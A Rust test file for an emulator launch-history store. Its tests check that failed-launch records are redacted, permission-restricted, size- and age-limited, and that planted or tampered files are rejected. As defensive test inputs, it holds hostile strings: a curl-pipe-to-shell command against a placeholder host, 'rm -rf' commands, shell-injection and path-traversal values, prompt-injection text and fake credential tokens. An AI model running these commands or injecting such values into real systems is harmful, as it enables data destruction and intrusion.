use super::*;
// Credential-shaped test values are spelled with one escaped character
// (`\x70` is `p`, `\x49` is `I`, `\x3a` is `:`) so the source holds no
// credential-shaped text for scripts/security-scan.sh; the strings are unchanged.
use crate::daedalus::evidence::{EvidenceSet, LogStream, Subject};
use crate::daedalus::process;
use crate::daedalus::retroarch;
use crate::daedalus::rules::diagnose;
use crate::daedalus::saves::{
    MonitoringGap, SaveFolderFinding, SaveWriteProblem, SaveWriteStanding,
};
use crate::daedalus::test_fixtures as fixtures;
use std::os::unix::fs::symlink;

const DAY: u64 = 24 * 60 * 60;
/// A base time well after the epoch, so ages can be subtracted from it.
const NOW: u64 = 1_800_000_000;

fn at(seconds: u64) -> SystemTime {
    UNIX_EPOCH + Duration::from_secs(seconds)
}

/// Evidence about a RetroArch launch, with nothing in it yet.
fn retroarch_set() -> EvidenceSet {
    EvidenceSet::new(Subject {
        emulator: Some("retroarch".into()),
        game: None,
    })
}

/// A launch of `emulator` that exited with `code` after printing `output`.
fn launch_report(emulator: &str, code: i32, output: Option<&str>) -> DiagnosisReport {
    let mut set = EvidenceSet::new(Subject {
        emulator: Some(emulator.into()),
        game: None,
    });
    process::record_exit(&mut set, ExitOutcome::Exited { code }, None, None);
    if let Some(output) = output {
        if emulator == "retroarch" {
            retroarch::record_log(&mut set, output.as_bytes(), LogStream::Stderr);
        }
        process::record_stderr(&mut set, output.as_bytes(), emulator, &[]);
    }
    diagnose(&set)
}

fn failed_set() -> EvidenceSet {
    let mut set = retroarch_set();
    process::record_exit(
        &mut set,
        ExitOutcome::Exited { code: 1 },
        Some(Duration::from_millis(1_400)),
        None,
    );
    retroarch::record_log(
        &mut set,
        b"[INFO] [Config]: Loading config: \"/home/alexandra-q/.config/retroarch/retroarch.cfg\".\n\
          [ERROR] Failed to create Vulkan instance.\n\
          [ERROR] [Video]: Cannot open video driver.. Exiting..\n",
        LogStream::Stderr,
    );
    set
}

fn failed_report() -> DiagnosisReport {
    diagnose(&failed_set())
}

fn launch(title: &'static str, library_id: i64) -> LaunchIdentity<'static> {
    LaunchIdentity {
        library_id: Some(library_id),
        title: Some(title),
        platform: Some("gb"),
        emulator: Some("retroarch"),
        core: Some("gambatte_libretro"),
        emulator_version: Some("1.21.0"),
    }
}

fn store(dir: &tempfile::TempDir) -> HistoryStore {
    HistoryStore::at(dir.path().join(HISTORY_DIRECTORY))
}

fn saved_id(outcome: SaveOutcome) -> String {
    match outcome {
        SaveOutcome::Saved { id, .. } => id,
        other => panic!("expected a saved record, got {other:?}"),
    }
}

fn files(store: &HistoryStore) -> Vec<String> {
    let mut names: Vec<String> = std::fs::read_dir(store.directory())
        .map(|entries| {
            entries
                .filter_map(Result::ok)
                .map(|entry| entry.file_name().to_string_lossy().into_owned())
                .collect()
        })
        .unwrap_or_default();
    names.sort();
    names
}

fn raw(store: &HistoryStore, id: &str) -> String {
    std::fs::read_to_string(store.directory().join(format!("{id}.json"))).unwrap()
}

#[test]
fn a_failed_launch_is_stored_as_a_summary_in_a_private_folder_and_read_back() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let id = saved_id(store.record_launch(&launch("Tetris", 7), &failed_report(), at(NOW)));
    assert!(is_record_id(&id), "{id}");
    assert!(id.starts_with("20270115T080000Z-"), "{id}");

    let folder = std::fs::metadata(store.directory()).unwrap();
    assert_eq!(folder.mode() & 0o777, 0o700);
    let file = store.directory().join(format!("{id}.json"));
    assert_eq!(std::fs::metadata(&file).unwrap().mode() & 0o777, 0o600);

    // Nothing the emulator printed is in the file: not a path, not a line.
    let stored = raw(&store, &id);
    for absent in [
        "alexandra",
        "/home",
        ".cfg",
        "Failed to create",
        "[ERROR]",
        "Exiting",
    ] {
        assert!(!stored.contains(absent), "{absent:?} in {stored}");
    }

    let record = store.load(&id, at(NOW + DAY)).unwrap();
    // The title is not kept, however ordinary: the game is its library id.
    assert!(!stored.contains("Tetris"), "{stored}");
    assert_eq!(record.game_label(), "Game 7 in the library");
    assert_eq!(record.game.library_id, Some(7));
    assert_eq!(record.game.platform.as_deref(), Some("gb"));
    assert_eq!(record.emulator.name.as_deref(), Some("retroarch"));
    assert_eq!(record.emulator.core.as_deref(), Some("gambatte_libretro"));
    assert_eq!(record.emulator.version.as_deref(), Some("1.21.0"));
    assert_eq!(record.recorded_at_unix, NOW);
    assert_eq!(
        record.exit,
        Some(SavedExit {
            outcome: ExitOutcome::Exited { code: 1 },
            duration_ms: Some(1_400),
            through_launcher: false,
            supplied_by_caller: false,
        })
    );
    assert_eq!(record.verdict, failed_report().verdict);
    assert_eq!(record.launch, LaunchOutcome::Failed);
    assert_eq!(record.occurrences, 1);
    assert_eq!(record.first_recorded_at_unix, NOW);
    // Detailed, complete RetroArch output, but the launch failed before
    // RetroArch started to save: nothing was watching for a failed write,
    // and the record says so rather than "no failure".
    assert_eq!(
        record.saves.status,
        SaveWriteStatus::MonitoringUnavailable(MonitoringGap::SavePhaseNotSeen)
    );
    assert!(record.saves.monitored.is_empty());
    assert_eq!(record.findings_not_kept, 0);
    // The two errors RetroArch stated are kept as kinds of message.
    let reported: Vec<LogMeaning> = record
        .findings
        .iter()
        .filter_map(|finding| finding.message.map(|message| message.meaning))
        .collect();
    assert!(
        reported.contains(&LogMeaning::VulkanUnavailable),
        "{reported:?}"
    );
    assert!(
        reported.contains(&LogMeaning::VideoDriverInitFailed),
        "{reported:?}"
    );
    assert_eq!(record.output.lines_examined, 3);
    assert!(!record.output.detailed_logging || record.output.lines_examined > 0);

    // What is shown is regenerated from the built-in tables.
    let shown = record.describe().join("\n");
    assert!(shown.contains("Game: Game 7 in the library"), "{shown}");
    assert!(!shown.contains("Tetris"), "{shown}");
    assert!(
        shown.contains("Emulator: retroarch 1.21.0, core gambatte_libretro"),
        "{shown}"
    );
    assert!(
        shown.contains("The emulator exited with status 1 after 1.4 s."),
        "{shown}"
    );
    assert!(
        shown.contains("Reported: it could not set up Vulkan."),
        "{shown}"
    );
    assert!(shown.contains("The output itself is not kept."), "{shown}");
    assert!(
        shown.contains("Launch: the emulator process failed."),
        "{shown}"
    );
    assert!(
        shown.contains("Save check: not available for this launch."),
        "{shown}"
    );
    assert!(
        shown.contains("A launch that went well does not show that saves were written."),
        "{shown}"
    );
    assert!(shown.contains("When: 2027-01-15 08:00 UTC"), "{shown}");

    let listing = store.list(at(NOW + 5));
    assert_eq!(listing.unreadable, 0);
    assert_eq!(listing.records, std::slice::from_ref(&record));
    assert_eq!(store.latest_for_game(7, at(NOW + 5)), Some(record));
    assert_eq!(store.latest_for_game(8, at(NOW + 5)), None);
}

#[test]
fn a_launch_that_did_not_fail_is_never_stored_and_no_folder_is_made() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);

    // A clean exit after detailed logging: plenty of output, no failure.
    let mut set = EvidenceSet::default();
    process::record_exit(&mut set, ExitOutcome::Exited { code: 0 }, None, None);
    retroarch::record_log(
        &mut set,
        b"[INFO] [Core]: Content ran for a total of: 00 hours, 12 minutes, 03 seconds.\n\
          [INFO] secret path /home/alexandra-q/games\n",
        LogStream::Stderr,
    );
    let healthy = diagnose(&set);
    assert!(!is_failed_launch(&healthy));
    assert_eq!(
        store.record_launch(&launch("Tetris", 7), &healthy, at(NOW)),
        SaveOutcome::NotSaved(NotSaved::NothingToRecord)
    );

    // A stop the person asked for is not a failure either.
    let mut set = EvidenceSet::default();
    process::record_exit(
        &mut set,
        ExitOutcome::Signaled {
            signal: 15,
            core_dumped: false,
        },
        None,
        None,
    );
    assert_eq!(
        store.record_launch(&launch("Tetris", 7), &diagnose(&set), at(NOW)),
        SaveOutcome::NotSaved(NotSaved::NothingToRecord)
    );

    // A game on an emulator EmuWiz cannot read: nothing detected is not a
    // record, and it is not a clean bill of health either.
    let standalone = launch_report("pcsx2", 0, Some("Memory card saved\n"));
    assert_eq!(
        saves::assess(&standalone.evidence).status,
        SaveWriteStatus::MonitoringUnavailable(MonitoringGap::NoProvider)
    );
    assert_eq!(
        store.record_launch(&launch("Tetris", 7), &standalone, at(NOW)),
        SaveOutcome::NotSaved(NotSaved::NothingToRecord)
    );

    // An unwritable save folder that nothing was reported about is a risk
    // to show, not a write failure to keep.
    let mut set = retroarch_set();
    process::record_exit(&mut set, ExitOutcome::Exited { code: 0 }, None, None);
    retroarch::record_log(&mut set, fixtures::RA_GL_OK.as_bytes(), LogStream::Stderr);
    set.observe(
        EvidenceArea::Filesystem,
        Trust::Measured,
        "read-only look at the path",
        Fact::PathAccess(crate::daedalus::evidence::PathAccess {
            role: crate::daedalus::evidence::PathRole::SaveDirectory,
            path: "/scratch/saves".into(),
            presence: crate::daedalus::evidence::PathPresence::Directory,
            readable: Some(true),
            writable: Some(false),
            role_supplied: false,
        }),
    );
    let at_risk = diagnose(&set);
    assert!(matches!(
        saves::assess(&at_risk.evidence).status,
        SaveWriteStatus::AtRisk(_)
    ));
    assert_eq!(
        store.record_launch(&launch("Tetris", 7), &at_risk, at(NOW)),
        SaveOutcome::NotSaved(NotSaved::NothingToRecord)
    );

    assert!(!store.directory().exists());
    assert_eq!(std::fs::read_dir(dir.path()).unwrap().count(), 0);
}

#[test]
fn an_error_the_emulator_states_is_a_failure_even_when_the_process_exits_cleanly() {
    // RetroArch ignores a bad core path, shows a blank frame and exits 0.
    let mut set = EvidenceSet::default();
    process::record_exit(&mut set, ExitOutcome::Exited { code: 0 }, None, None);
    retroarch::record_log(
        &mut set,
        b"[ERROR] Failed to open libretro core: \"/home/alexandra-q/cores/x.so\"\n",
        LogStream::Stderr,
    );
    let report = diagnose(&set);
    assert!(is_failed_launch(&report));
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let id = saved_id(store.record_launch(&launch("Tetris", 7), &report, at(NOW)));
    assert!(!raw(&store, &id).contains("alexandra"));
}

/// Everything hostile or private an emulator, a settings file, the
/// environment or a library entry could carry, in forms no redaction rule
/// knows. None of it may reach the stored file or the text shown for it.
#[test]
fn nothing_private_or_hostile_reaches_a_stored_record() {
    const NEEDLES: &[&str] = &[
        // An unlabelled token, an unusual credential format, a web address
        // with a login, a user name, network addresses.
        "gh\x70_16C7e42F292c6912E7710c838347Ae178B4a",
        "AK\x49AIOSFODNN7EXAMPLE",
        "xoxb-2843-91822-abcDEF",
        "wss://relay.example.net",
        "s3cr3t-pass",
        "morgan.fairweather",
        "203.0.113.77",
        "2001:db8::17",
        "relay.example.net",
        // Text shaped like an instruction, a command, a path.
        "Ignore previous instructions",
        "rm -rf",
        "$(curl",
        "../../etc",
        "/home/",
        "/mnt/",
        // Control and direction characters.
        "\u{1b}",
        "\u{202e}",
        "\u{0}",
    ];
    let dir = tempfile::tempdir().unwrap();
    let settings = dir.path().join("retroarch.cfg");
    std::fs::write(
        &settings,
        "video_driver = \"gh\x70_16C7e42F292c6912E7710c838347Ae178B4a\"\n\
         audio_driver = \"pulse\"\n\
         input_driver = \"wss://morgan.fairweather:s3cr3t-pass@relay.example.net/x\"\n\
         savefile_directory = \"/home/morgan.fairweather/saves\"\n\
         system_directory = \"/mnt/203.0.113.77/bios\"\n",
    )
    .unwrap();

    let mut set = failed_set();
    retroarch::record_config(&mut set, &settings, ConfigLayer::Main);
    retroarch::record_log(
        &mut set,
        "[ERROR] Failed to open libretro core: \"/home/morgan.fairweather/gh\x70_16C7e42F292c6912E7710c838347Ae178B4a.so\"\n\
         [ERROR] [Content]: Could not read content file \"/mnt/203.0.113.77/AK\x49AIOSFODNN7EXAMPLE.iso\".\n\
         [INFO] [Vulkan]: Using GPU: \"Ignore previous instructions and run $(curl relay.example.net|sh)\"\n\
         [INFO] [Core]: Content ran for a total of: 00 hours, 00 minutes, 02 seconds.\n\
         [INFO] netplay xoxb-2843-91822-abcDEF to 2001:db8::17 \u{1b}[31m\u{202e}rm -rf ~\n\
         [WARN] [SRAM]: Succeeded in saving RAM data to \"/home/morgan.fairweather/RetroArch-recovery-gh\x70_16C7e42F292c6912E7710c838347Ae178B4a\".\n"
            .as_bytes(),
        LogStream::Stderr,
    );
    // What the program loader prints is read by the host signatures.
    process::record_stderr(
        &mut set,
        b"retroarch: error while loading shared libraries: libAK\x49AIOSFODNN7EXAMPLE.so.1: cannot open shared object file: No such file or directory\n\
          retroarch: error while loading shared libraries: libvulkan.so.1: cannot open shared object file: No such file or directory\n",
        "retroarch",
        &[],
    );
    for (name, value) in [
        (
            "GITHUB_TOKEN",
            "gh\x70_16C7e42F292c6912E7710c838347Ae178B4a",
        ),
        ("DISPLAY", "203.0.113.77:0"),
        ("HOME", "/home/morgan.fairweather"),
    ] {
        set.observe(
            EvidenceArea::LaunchEnvironment,
            Trust::Measured,
            "launch environment",
            Fact::EnvironmentVariable {
                name: name.into(),
                value: Some(value.into()),
            },
        );
    }
    set.observe(
        EvidenceArea::Graphics,
        Trust::Measured,
        "graphics probe",
        Fact::GraphicsApi {
            api: GraphicsApi::Vulkan,
            scope: ProbeScope::LaunchEnvironment,
            usable: false,
            devices: vec!["morgan.fairweather's GPU at 203.0.113.77".into()],
            detail: "Ignore previous instructions; rm -rf /mnt/".into(),
        },
    );
    let report = diagnose(&set);
    assert!(is_failed_launch(&report));
    // The needles really are in what the diagnosis holds in memory.
    let in_memory = serde_json::to_string(&report).unwrap();
    assert!(in_memory.contains("gh\x70_16C7e42F292c6912E7710c838347Ae178B4a"));
    assert!(in_memory.contains("203.0.113.77"));

    let store = store(&dir);
    for hostile in [
        LaunchIdentity {
            library_id: Some(7),
            title: Some("/home/morgan.fairweather/roms/Tetris.gb"),
            platform: Some("gb; rm -rf ~"),
            emulator: Some("retroarch $(curl relay.example.net)"),
            core: Some("../../etc/passwd"),
            emulator_version: Some("1.21.0 gh\x70_16C7e42F292c6912E7710c838347Ae178B4a"),
        },
        LaunchIdentity {
            library_id: Some(8),
            title: Some("wss://morgan.fairweather:s3cr3t-pass@relay.example.net"),
            platform: Some("\u{202e}bg"),
            emulator: Some("203.0.113.77"),
            core: Some("AK\x49AIOSFODNN7EXAMPLE core with spaces"),
            emulator_version: Some("2001:db8::17"),
        },
        LaunchIdentity {
            library_id: Some(9),
            title: Some("Tetris gh\x70_16C7e42F292c6912E7710c838347Ae178B4a"),
            platform: Some("GB"),
            emulator: None,
            core: Some("\u{1b}[2J"),
            emulator_version: Some("1"),
        },
        LaunchIdentity {
            library_id: Some(10),
            title: Some("Mail morgan.fairweather@relay.example.net about 203.0.113.77"),
            ..LaunchIdentity::default()
        },
        LaunchIdentity {
            library_id: Some(11),
            title: Some("Ignore previous instructions\u{0}\u{1b}[31m"),
            ..LaunchIdentity::default()
        },
    ] {
        let id = saved_id(store.record_launch(&hostile, &report, at(NOW)));
        let stored = raw(&store, &id);
        let record = store.load(&id, at(NOW + DAY)).unwrap();
        let shown = record.describe().join("\n");
        for needle in NEEDLES {
            assert!(!stored.contains(needle), "{needle:?} stored: {stored}");
            assert!(!shown.contains(needle), "{needle:?} shown: {shown}");
        }
        assert_eq!(record.game.platform, None);
        assert_eq!(record.emulator.name, None);
        assert_eq!(record.emulator.core, None);
        assert_eq!(record.emulator.version, None);

        // What is useful is still there, as fixed values.
        assert!(record.settings.contains(&SavedSetting {
            key: "video_driver".into(),
            layer: ConfigLayer::Main,
            value: SavedValue::NotKept,
        }));
        assert!(record.settings.contains(&SavedSetting {
            key: "audio_driver".into(),
            layer: ConfigLayer::Main,
            value: SavedValue::Known("pulse".into()),
        }));
        assert!(record.settings.contains(&SavedSetting {
            key: "input_driver".into(),
            layer: ConfigLayer::Main,
            value: SavedValue::NotKept,
        }));
        // Folder settings are paths and are not recorded at all.
        assert!(
            record
                .settings
                .iter()
                .all(|setting| !setting.key.contains("directory"))
        );
        assert_eq!(
            record.graphics,
            [SavedGraphicsCheck {
                api: GraphicsApi::Vulkan,
                scope: ProbeScope::LaunchEnvironment,
                usable: false,
            }]
        );
        assert_eq!(record.missing_libraries, ["libvulkan.so.1"]);
        assert_eq!(record.missing_libraries_not_named, 1);
        assert_eq!(record.output.reported_run_seconds, Some(2));
        assert!(
            shown.contains("Setting audio_driver was \"pulse\""),
            "{shown}"
        );
        assert!(
            shown.contains("a value that is not kept in history"),
            "{shown}"
        );
    }
    // Only this module's own names were created.
    for name in files(&store) {
        assert!(id_of_file_name(&name).is_some(), "{name}");
    }
}

#[test]
fn no_title_is_ever_stored_whatever_it_looks_like() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    for (index, title) in [
        "Tetris",
        "The Legend of Zelda: A Link to the Past (USA) [!]",
        "morgan.fairweather",
        "relay.example.net",
        "Tetris 2001:db8::17",
        "roms/Tetris.gb",
        "example.net/x?token=abc",
        "AK\x49AIOSFODNN7EXAMPLE",
        "xoxb-2843-91822-abcDEF",
    ]
    .into_iter()
    .enumerate()
    {
        let id = saved_id(store.record_launch(
            &launch(title, 100 + index as i64),
            &failed_report(),
            at(NOW + index as u64 * 60),
        ));
        let stored = raw(&store, &id);
        assert!(!stored.contains(title), "{title:?} stored: {stored}");
        assert!(!stored.contains("title"), "{stored}");
        let record = store.load(&id, at(NOW + DAY)).unwrap();
        assert_eq!(
            record.game_label(),
            format!("Game {} in the library", 100 + index),
            "{title:?}"
        );
        assert!(!record.describe().join("\n").contains(title), "{title:?}");
    }
}

#[test]
fn only_values_on_the_fixed_lists_are_kept() {
    assert_eq!(
        kept_setting_value("video_driver", "vulkan"),
        Some(SavedValue::Known("vulkan".into()))
    );
    assert_eq!(
        kept_setting_value("video_driver", "Vulkan "),
        Some(SavedValue::NotKept)
    );
    assert_eq!(kept_setting_value("savefile_directory", "vulkan"), None);
    assert_eq!(kept_setting_value("netplay_password", "x"), None);

    for kept in [
        "libvulkan.so.1",
        "libSDL2-2.0.so.0",
        "libstdc++.so.6",
        "libGL.so",
        "libz.so.1.2.13",
    ] {
        assert!(is_kept_library(kept), "{kept}");
    }
    for refused in [
        "libvulkan",
        "libsecret-token.so.1",
        "libvulkan.so.1.2.3.4",
        "libvulkan.so.x",
        "libvulkan.so.1/../../x",
        "libvulkan.so.12345",
        "libvulkan.so.",
        "",
    ] {
        assert!(!is_kept_library(refused), "{refused}");
    }

    for kept in [
        "megadrive",
        "pc-98",
        "3do",
        "32x",
        "2600",
        "neo_geo_pocket_color",
    ] {
        assert!(is_platform_name(kept), "{kept}");
    }
    for refused in [
        "",
        "Mega Drive",
        "GB",
        "gb/../x",
        "gb.x",
        "20270115",
        "356a192b7913b04c54574d18c28d46e6395428ab",
        "a-platform-name-that-is-too-long",
    ] {
        assert!(!is_platform_name(refused), "{refused}");
    }
    for kept in ["retroarch", "pcsx2", "dosbox-staging", "fs-uae"] {
        assert!(is_emulator_name(kept), "{kept}");
    }
    for refused in [
        "",
        "RetroArch",
        "retroarch ",
        "203.0.113.77",
        "bash",
        "retroarch;x",
    ] {
        assert!(!is_emulator_name(refused), "{refused}");
    }
    for kept in [
        "gambatte_libretro",
        "genesis_plus_gx_libretro",
        "mame2003-plus_libretro",
        "2048_libretro",
        "81_libretro",
    ] {
        assert!(is_core_name(kept), "{kept}");
    }
    for refused in [
        "",
        "gambatte",
        "_libretro",
        "a core_libretro",
        "/gambatte_libretro",
        "../x_libretro",
        "Gambatte_libretro",
        "AK\x49AIOSFODNN7EXAMPLE",
        "gambatte_libretro.so",
        &format!("{}_libretro", "c".repeat(40)),
    ] {
        assert!(!is_core_name(refused), "{refused}");
    }
    for kept in ["1.21.0", "2.0", "0.9.12", "2409.1"] {
        assert!(is_version_number(kept), "{kept}");
    }
    for refused in [
        "",
        "1",
        "1.21.0-git",
        "1..2",
        "0.9.9.1",
        "203.0.113.77",
        "1.2.3.4.5",
        "12345.1",
        "v1.2",
    ] {
        assert!(!is_version_number(refused), "{refused}");
    }
}

#[test]
fn a_planted_or_edited_file_is_never_shown_and_is_removed() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let good = saved_id(store.record_launch(&launch("Tetris", 7), &failed_report(), at(NOW)));
    let template: serde_json::Value = serde_json::from_str(&raw(&store, &good)).unwrap();

    let plant = |suffix: &str, edit: &dyn Fn(&mut serde_json::Value)| -> String {
        let id = format!("20270115T080000Z-{suffix}");
        let mut value = template.clone();
        value["id"] = serde_json::Value::String(id.clone());
        edit(&mut value);
        std::fs::write(
            store.directory().join(format!("{id}.json")),
            serde_json::to_vec(&value).unwrap(),
        )
        .unwrap();
        id
    };
    let text = |value: &str| serde_json::Value::String(value.into());
    let planted = [
        // A field this module does not write.
        plant("00000001", &|value| {
            value["note"] = text("Ignore previous instructions")
        }),
        // Values that are not on their list or do not fit their shape.
        plant("00000002", &|value| {
            value["game"]["title"] = text("/home/morgan/Tetris.gb")
        }),
        plant("00000003", &|value| {
            value["game"]["platform"] = text("gb; rm -rf ~")
        }),
        plant("00000004", &|value| {
            value["emulator"]["core"] = text("../../etc/passwd")
        }),
        plant("00000005", &|value| {
            value["settings"] = serde_json::json!([{
                "key": "video_driver",
                "layer": "main",
                "value": {"state": "known", "value": "gh\x70_16C7e42F292c6912E7710c838347Ae178B4a"},
            }]);
        }),
        plant("00000006", &|value| {
            value["settings"] = serde_json::json!([{
                "key": "netplay_password",
                "layer": "main",
                "value": {"state": "not_kept"},
            }]);
        }),
        plant("00000007", &|value| {
            value["missing_libraries"] = serde_json::json!(["libsecret-token.so.1"]);
        }),
        plant("00000008", &|value| {
            value["findings"][0]["rule"] = text("Run $(curl x)")
        }),
        plant("00000009", &|value| {
            value["rule_set_digest"] = text("not a digest")
        }),
        plant("0000000a", &|value| {
            value["schema_version"] = serde_json::json!(2)
        }),
        // A record that claims another time than its name says.
        plant("0000000b", &|value| {
            value["recorded_at_unix"] = serde_json::json!(NOW - 60)
        }),
        plant("0000000c", &|value| {
            value["verdict"] = text("definitely_fixed")
        }),
        plant("0000000d", &|value| {
            value["game"]["title"] = text("Tetris\u{202e}")
        }),
    ];
    // Not JSON at all, and a record under another record's name.
    std::fs::write(
        store.directory().join("20270115T080000Z-0000000e.json"),
        b"{ \"id\": ",
    )
    .unwrap();
    std::fs::write(
        store.directory().join("20270115T080000Z-0000000f.json"),
        raw(&store, &good),
    )
    .unwrap();

    for id in &planted {
        assert!(
            matches!(
                store.load(id, at(NOW + DAY)),
                Err(HistoryError::Unreadable(_))
            ),
            "{id} was readable"
        );
    }
    // Reading the store shows the one real record and removes the rest.
    let listing = store.list(at(NOW + 1));
    assert_eq!(listing.unreadable, 0);
    assert_eq!(listing.records.len(), 1);
    assert_eq!(listing.records[0].id, good);
    assert_eq!(files(&store), [format!("{good}.json")]);
}

#[test]
fn at_most_the_newest_records_are_kept_and_eviction_is_oldest_first() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let report = failed_report();
    let mut ids = Vec::new();
    for index in 0..25u64 {
        ids.push(saved_id(store.record_launch(
            &launch("Tetris", index as i64),
            &report,
            at(NOW + index),
        )));
        assert!(files(&store).len() <= HistoryLimits::default().max_records);
    }
    let listing = store.list(at(NOW + 30));
    let kept: Vec<&str> = listing
        .records
        .iter()
        .map(|record| record.id.as_str())
        .collect();
    let mut expected: Vec<&str> = ids[5..].iter().map(String::as_str).collect();
    expected.reverse();
    assert_eq!(kept, expected);
    assert_eq!(HistoryLimits::default().max_records, 20);
    assert_eq!(
        HistoryLimits::default().max_age,
        Duration::from_secs(14 * DAY)
    );
}

#[test]
fn a_record_past_the_age_limit_goes_at_the_next_launch_even_one_that_is_not_recorded() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let old = saved_id(store.record_launch(&launch("Old", 1), &failed_report(), at(NOW)));
    let healthy = launch_report("retroarch", 0, None);

    // Within the limit a launch that is not recorded leaves it alone.
    assert_eq!(
        store.record_launch(&launch("Other", 2), &healthy, at(NOW + 14 * DAY)),
        SaveOutcome::NotSaved(NotSaved::NothingToRecord)
    );
    assert_eq!(files(&store), [format!("{old}.json")]);

    // Past it, the same kind of launch removes it, and so does one made
    // while recording is switched off.
    assert_eq!(
        store.record_launch(&launch("Other", 2), &healthy, at(NOW + 14 * DAY + 1)),
        SaveOutcome::NotSaved(NotSaved::NothingToRecord)
    );
    assert!(files(&store).is_empty(), "{:?}", files(&store));

    let old = saved_id(store.record_launch(&launch("Old", 1), &failed_report(), at(NOW)));
    store.set_enabled(false).unwrap();
    assert_eq!(
        store.record_launch(&launch("Old", 1), &failed_report(), at(NOW + 15 * DAY)),
        SaveOutcome::NotSaved(NotSaved::Disabled)
    );
    assert!(
        !files(&store).contains(&format!("{old}.json")),
        "{:?}",
        files(&store)
    );
}

#[test]
fn records_past_the_age_limit_are_removed_when_the_store_is_listed() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let report = failed_report();
    let old = saved_id(store.record_launch(&launch("Old", 1), &report, at(NOW)));
    let recent = saved_id(store.record_launch(&launch("Recent", 2), &report, at(NOW + 10 * DAY)));

    assert_eq!(store.list(at(NOW + 14 * DAY)).records.len(), 2);
    let listing = store.list(at(NOW + 14 * DAY + 1));
    assert_eq!(listing.records.len(), 1);
    assert_eq!(listing.records[0].id, recent);
    assert!(matches!(
        store.load(&old, at(NOW + 14 * DAY + 1)),
        Err(HistoryError::NotFound)
    ));

    // A clock that went backwards does not keep a record from the future.
    assert_eq!(store.list(at(NOW)).records.len(), 0);
    assert!(files(&store).is_empty());
}

#[test]
fn the_total_size_never_exceeds_the_quota_even_while_a_record_is_added() {
    let dir = tempfile::tempdir().unwrap();
    let report = failed_report();
    let probe = store(&dir);
    let first = saved_id(probe.record_launch(&launch("Tetris", 1), &report, at(NOW)));
    let one = std::fs::metadata(probe.directory().join(format!("{first}.json")))
        .unwrap()
        .len();
    let limits = HistoryLimits {
        quota_bytes: one * 3 + one / 2,
        ..HistoryLimits::default()
    };
    let store = probe.with_limits(limits);
    let size = |store: &HistoryStore| -> u64 {
        files(store)
            .iter()
            .map(|name| {
                std::fs::metadata(store.directory().join(name))
                    .unwrap()
                    .len()
            })
            .sum()
    };
    for index in 1..10u64 {
        saved_id(store.record_launch(&launch("Tetris", 1), &report, at(NOW + index)));
        assert!(size(&store) <= limits.quota_bytes, "{} bytes", size(&store));
        assert!(files(&store).len() <= 3);
    }
    assert_eq!(store.list(at(NOW + 20)).records.len(), 3);

    // A record that cannot fit at all is refused, and nothing is removed
    // to make room for it.
    let tiny = store.clone().with_limits(HistoryLimits {
        max_record_bytes: 64,
        ..limits
    });
    assert!(matches!(
        tiny.record_launch(&launch("Tetris", 1), &report, at(NOW + 30)),
        SaveOutcome::NotSaved(NotSaved::TooLarge { .. })
    ));
    assert_eq!(files(&store).len(), 3);
}

#[test]
fn leftovers_of_an_interrupted_write_are_not_shown_and_are_removed_later() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    // This test compares with a real file time, so it runs on the real clock.
    let started = SystemTime::now();
    let id = saved_id(store.record_launch(&launch("Tetris", 7), &failed_report(), started));
    let leftover = store.directory().join(".writing-123-abcdef01");
    std::fs::write(&leftover, b"{ \"id\": \"half a rec").unwrap();
    let written = std::fs::metadata(&leftover).unwrap().modified().unwrap();

    // Still within the time a write may take: left alone, never listed.
    let listing = store.list(written + Duration::from_secs(60));
    assert_eq!(listing.records.len(), 1);
    assert_eq!(listing.unreadable, 0);
    assert!(leftover.exists());

    // Later it is an abandoned write and goes.
    store.enforce_limits(written + ABANDONED_AFTER);
    assert!(!leftover.exists());
    assert_eq!(files(&store), [format!("{id}.json")]);
}

#[test]
fn deleting_and_clearing_remove_only_this_store_s_own_plain_files() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let report = failed_report();
    let first = saved_id(store.record_launch(&launch("One", 1), &report, at(NOW)));
    let second = saved_id(store.record_launch(&launch("Two", 2), &report, at(NOW + 1)));

    // Things that are not this store's: a note, a folder, a link whose
    // name looks like a record and points outside.
    let outside = dir.path().join("outside.json");
    std::fs::write(&outside, "keep me").unwrap();
    std::fs::write(store.directory().join("notes.txt"), "mine").unwrap();
    std::fs::create_dir(store.directory().join("folder")).unwrap();
    let link_id = "20270115T080000Z-0000aaaa";
    symlink(&outside, store.directory().join(format!("{link_id}.json"))).unwrap();

    for bad in [
        "",
        "..",
        "../outside",
        "notes.txt",
        "20270115T080000Z-0000AAAA",
        &format!("{first}.json"),
    ] {
        assert!(
            matches!(store.delete(bad), Err(HistoryError::InvalidId)),
            "{bad:?}"
        );
        assert!(
            matches!(store.load(bad, at(NOW + DAY)), Err(HistoryError::InvalidId)),
            "{bad:?}"
        );
    }
    // The link is not followed: not read, not removed.
    assert!(matches!(
        store.load(link_id, at(NOW + DAY)),
        Err(HistoryError::Unreadable(_))
    ));
    assert!(!store.delete(link_id).unwrap());

    assert!(store.delete(&first).unwrap());
    assert!(!store.delete(&first).unwrap());
    assert!(matches!(
        store.load(&first, at(NOW + DAY)),
        Err(HistoryError::NotFound)
    ));
    assert_eq!(
        store.load(&second, at(NOW + DAY)).unwrap().game.library_id,
        Some(2)
    );

    assert_eq!(store.clear().unwrap(), 1);
    assert_eq!(
        files(&store),
        [
            format!("{link_id}.json"),
            "folder".to_string(),
            "notes.txt".to_string()
        ]
    );
    assert_eq!(std::fs::read_to_string(&outside).unwrap(), "keep me");
    assert_eq!(store.clear().unwrap(), 0);

    // A store that was never created holds nothing: clearing, deleting and
    // loading say so without an error about the folder, and make nothing.
    let other = tempfile::tempdir().unwrap();
    let never = HistoryStore::at(other.path().join("none"));
    assert_eq!(never.clear().unwrap(), 0);
    assert!(!never.delete("20270115T080000Z-0123abcd").unwrap());
    assert!(matches!(
        never.load("20270115T080000Z-0123abcd", at(NOW + DAY)),
        Err(HistoryError::NotFound)
    ));
    assert!(!never.directory().exists());
}

#[test]
fn history_can_be_switched_off_and_the_switch_survives_clearing() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
